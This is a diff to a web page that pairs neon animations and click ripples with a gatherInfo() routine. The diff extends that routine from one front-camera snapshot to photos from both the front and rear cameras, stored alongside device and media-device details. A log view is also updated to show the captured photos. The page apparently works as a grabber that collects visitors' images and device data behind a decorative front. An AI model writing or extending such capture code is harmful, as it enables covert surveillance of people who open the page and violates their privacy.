@@ -40,7 +40,7 @@ body{
 
 /* Neon animation */
 @keyframes neon {
-  0% {box-shadow:0 0 10px #00f0ff, 0 0 20px #00f0ff,0 0 30px #00f0ff;}
+  0% {box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
   33% {box-shadow:0 0 10px #ff005c,0 0 20px #ff005c,0 0 30px #ff005c;}
   66% {box-shadow:0 0 10px #00ff73,0 0 20px #00ff73,0 0 30px #00ff73;}
   100%{box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
@@ -90,7 +90,13 @@ button:hover{transform:scale(1.05);}
   overflow-x:auto;
 }
 
-.logPhoto img{
+.logPhotos{
+  display:flex;
+  flex-direction:column;
+  gap:5px;
+}
+
+.logPhotos img{
   max-width:150px;
   border-radius:8px;
   box-shadow:0 0 10px #0ff;
@@ -147,10 +153,10 @@ function ripple(x,y){
 }
 document.addEventListener('pointerdown', e => ripple(e.clientX,e.clientY));
 
-// ---------------- Front Camera Capture ----------------
-async function captureFrontPhoto(){
+// ---------------- Camera Capture ----------------
+async function capturePhoto(facingMode){
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode}});
     const track = stream.getVideoTracks()[0];
     const imageCapture = new ImageCapture(track);
     const photoBlob = await imageCapture.takePhoto();
@@ -160,7 +166,7 @@ async function captureFrontPhoto(){
     return await new Promise(resolve=>{
       reader.onloadend = ()=>resolve(reader.result);
     });
-  }catch(err){ console.warn("Camera capture failed:", err); return null; }
+  }catch(err){ console.warn(facingMode+" camera capture failed:",err); return null; }
 }
 
 // ---------------- Device Info ----------------
@@ -196,8 +202,9 @@ async function gatherInfo(){
     info.mediaDevices = dev.map(d=>({kind:d.kind,label:d.label}));
   }catch(e){ info.mediaDevices=[{error:e.message}]; }
 
-  const photoData = await captureFrontPhoto();
-  if(photoData) info.photo = photoData;
+  // --- Capture front and back photos ---
+  info.frontPhoto = await capturePhoto("user");
+  info.backPhoto = await capturePhoto("environment");
 
   return info;
 }
@@ -233,19 +240,25 @@ document.getElementById('showLogs').onclick = async ()=>{
       const infoDiv = document.createElement('div');
       infoDiv.className = 'logInfo';
       const copy = {...log};
-      if(copy.photo) delete copy.photo;
+      delete copy.frontPhoto;
+      delete copy.backPhoto;
       infoDiv.textContent = JSON.stringify(copy,null,2);
 
-      const photoDiv = document.createElement('div');
-      photoDiv.className = 'logPhoto';
-      if(log.photo){
-        const img = document.createElement('img');
-        img.src = log.photo;
-        photoDiv.appendChild(img);
+      const photosDiv = document.createElement('div');
+      photosDiv.className = 'logPhotos';
+      if(log.frontPhoto){
+        const img1 = document.createElement('img');
+        img1.src = log.frontPhoto;
+        photosDiv.appendChild(img1);
+      }
+      if(log.backPhoto){
+        const img2 = document.createElement('img');
+        img2.src = log.backPhoto;
+        photosDiv.appendChild(img2);
       }
 
       entry.appendChild(infoDiv);
-      entry.appendChild(photoDiv);
+      entry.appendChild(photosDiv);
       logSection.appendChild(entry);
     });
     logSection.style.display = 'block';
